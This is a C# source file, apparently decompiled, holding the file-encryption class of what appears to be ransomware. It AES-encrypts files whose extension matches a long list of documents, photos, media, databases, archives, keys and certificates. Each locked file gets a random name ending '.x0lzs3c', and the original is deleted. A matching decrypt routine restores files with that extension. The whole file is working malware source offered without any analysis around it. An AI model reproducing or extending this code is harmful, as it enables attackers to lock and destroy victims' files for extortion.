using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace chatwithus;

public class CryptFile
{
	[DebuggerNonUserCode]
	public CryptFile()
	{
	}

	public static bool decryptFile(string orgFile, byte[] aesKey)
	{
		checked
		{
			try
			{
				string text = new FileInfo(orgFile).DirectoryName + "\\";
				string extension = new FileInfo(orgFile).Extension;
				_ = new FileInfo(orgFile).get_Name().Split(new char[1] { '.' })[0];
				if (Operators.CompareString(extension, ".x0lzs3c", false) != 0)
				{
					return false;
				}
				byte[] byte_ciphertext = File.ReadAllBytes(orgFile);
				byte_ciphertext = AES.AES.decrypt(byte_ciphertext, aesKey);
				byte[] array = new byte[256];
				Array.ConstrainedCopy(byte_ciphertext, byte_ciphertext.Length - 256, array, 0, 256);
				string @string = Encoding.UTF8.GetString(array);
				@string = @string.TrimEnd(new char[1]);
				Array.Resize(ref byte_ciphertext, byte_ciphertext.Length - 256);
				File.WriteAllBytes(text + @string, byte_ciphertext);
				File.Delete(orgFile);
				return true;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static bool encryptFile(string orgFile, byte[] aesKey)
	{
		checked
		{
			try
			{
				string text = new FileInfo(orgFile).DirectoryName + "\\";
				string name = new FileInfo(orgFile).get_Name();
				string text2 = new FileInfo(orgFile).Extension.ToLower();
				if (!".txt .text .cur .contact .ani .xls .lng .com .ion .url .ppt .src .cmd .exe .tgz .fon .pl .lib .load .CompositeFont .png .mp3 .mkv .veg .mp4 .lnk .zip .rar .7z .jpg .sln .crdownload .msi .vb .vbs .vbt .config .settings .resx .vbproj .json .jpeg .scss .css .html .hta .ttc .ttf .eot .camproj .m4r .001 .002 .003 .004 .005 .006 .007 .008 .009 .au .aex .8be .8bf .8bi .abr .adf .apk .ai .asd .bin .bat .gif .3dm .3g2 .3gp .aaf .accdb .aep .aepx .aet .ai .aif .arw .as .as3 .asf .asp .asx .avi .bay .bmp .cdr .cer .class .cpp .contact .cr2 .crt .crw .cs .csv .dat .dll .db .dbf .dcr .der .dng .doc .docb .docm .docx .dot .dotm .dotx .dwg .dxf .dxg .efx .eps .erf .fla .flv .iso .idml .iff .ini .SFX .sik .indb .indd .indl .indt .ico .inx .jar .jnt .jnt .java .key .kdc .m3u .m3u8 .m4u .max .mdb .mdf .mef .mid .mov .mpa .mpeg .mpg .mrw .msg .nef .nrw .odb .odc .odm .odp .ods .odt .orf .p12 .p7b .p7c .pdb .pdf .pef .pem .pfx .php .plb .pmd .pot .potm .potx .ppam .ppj .pps .ppsm .ppsx .ppt .pptm .pptx .prel .prproj .ps .psd .pst .ptx .r3d .ra .raf .raw .rb .rtf .rw2 .rwl .sdf .sldm .sldx .sql .sr2 .srf .srw .svg .swf .tif .vcf .vob .wav .wb2 .wma .wmv .wpd .wps .x3f .xla .xlam .xlk .xll .xlm .xls .xlsb .xlsm .xlsx .xlt .xltm .xltx .xlw .xml .xqx".Contains(text2) || Operators.CompareString(text2, "", false) == 0)
				{
					return false;
				}
				byte[] array = File.ReadAllBytes(orgFile);
				byte[] bytes = Encoding.UTF8.GetBytes(name);
				if (bytes.Length > 255)
				{
					return false;
				}
				Array.Resize(ref array, array.Length + 256);
				Array.ConstrainedCopy(bytes, 0, array, array.Length - 256, bytes.Length);
				File.WriteAllBytes(text + getRandomFileName() + ".x0lzs3c", AES.AES.encrypt(array, aesKey));
				File.Delete(orgFile);
				Thread.Sleep(500);
				return true;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception projectError = ex;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			return false;
		}
	}

	public static string getRandomFileName()
	{
		string text = "";
		string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~=!@#$%^&*()";
		Random random = new Random();
		int location = random.Next(4, 10);
		while (Math.Max(Interlocked.Decrement(ref location), checked(location + 1)) > 0)
		{
			text += Conversions.ToString(text2[random.Next(text2.Length)]);
		}
		return text;
	}
}
